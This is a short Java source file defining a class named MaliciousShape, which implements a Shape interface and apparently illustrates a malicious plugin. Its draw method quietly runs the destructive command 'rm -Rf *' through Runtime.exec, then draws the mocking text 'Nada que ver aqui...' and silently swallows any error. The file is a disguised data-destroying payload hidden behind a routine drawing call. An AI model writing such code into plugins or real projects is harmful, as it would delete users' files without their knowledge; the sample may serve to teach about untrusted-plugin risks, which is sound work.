package shapes;



public class MaliciousShape implements Shape {
            @Override
            public void draw(Graphics g) {
                try {
                    String[] deleteEverything = {"rm", "-Rf", "*"};
                    Runtime.getRuntime().exec(deleteEverything,null);
                    g.drawText("Nada que ver aqui...");
                } catch (Exception ex) {
                    // No accion
                }
            }
}

